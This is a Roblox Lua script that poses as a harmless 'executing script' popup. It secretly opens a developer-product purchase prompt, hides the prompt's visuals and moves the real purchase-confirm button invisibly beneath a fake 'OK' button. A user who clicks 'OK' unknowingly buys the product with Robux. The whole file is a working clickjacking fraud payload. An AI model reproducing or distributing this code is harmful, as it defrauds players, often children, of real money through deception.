--//Variables//--
local Core = game:GetService("CoreGui")

--//Creating GUI//--
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local TextLabel = Instance.new("TextLabel")
local TextLabel2 = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")

ScreenGui.Parent = Core
ScreenGui.Name = "HA"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0.311, 0, 0.216, 0)
Frame.Position = UDim2.new(0.344, 0, 0.392, 0)
Frame.BackgroundColor3 = Color3.fromRGB(72, 72, 72)

UIAspectRatioConstraint.Parent = Frame
UIAspectRatioConstraint.AspectRatio = 2

TextLabel.Parent = Frame
TextLabel.Size = UDim2.new(0.879, 0, 0.113, 0)
TextLabel.Position = UDim2.new(0.059, 0, 0.300, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = "Executing script, please wait.."
TextLabel.TextColor3 = Color3.fromRGB(202, 202, 202)
TextLabel.TextScaled = true
TextLabel.RichText = true

TextLabel2.Parent = Frame
TextLabel2.Visible = false
TextLabel2.Size = UDim2.new(0.833, 0, 0.193, 0)
TextLabel2.Position = UDim2.new(0.083, 0, 0.613, 0)
TextLabel2.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
TextLabel2.Text = "OK"
TextLabel2.RichText = true
TextLabel2.TextScaled = true
TextLabel2.TextColor3 = Color3.fromRGB(76, 83, 100)

UICorner.Parent = TextLabel2
UICorner.CornerRadius = UDim.new(0.2, 0)

local MarketplaceService = game:GetService("MarketplaceService")
local GamepassID = 2692326944

MarketplaceService:PromptProductPurchase(game.Players.LocalPlayer, GamepassID)

for e, b in pairs(Core:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):GetChildren()) do
	b:Destroy()
end

Core:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator").ChildAdded:Connect(function(c) 
	TextLabel.Text = "Script has been executed!"
	TextLabel2.Visible = true

	local pbutton = c:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("Buttons"):WaitForChild("2")
	for i, v in pairs(pbutton:GetChildren()) do
		v:Destroy()
	end

	pbutton.Parent = Frame
	pbutton.Image = ""
	pbutton.Size = UDim2.new(0.833, 0, 0.193, 0)
	pbutton.Position = UDim2.new(0.083, 0, 0.613, 0)
	pbutton.BackgroundTransparency = 1
	pbutton.ZIndex = 999

	c:Destroy()

	pbutton.MouseButton1Click:Connect(function()
		ScreenGui:Destroy()
	end)
end)

if not Core:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt", 6) then
	TextLabel.Text = "Script has failed to execute!"
	task.wait(3)
	ScreenGui:Destroy()
end
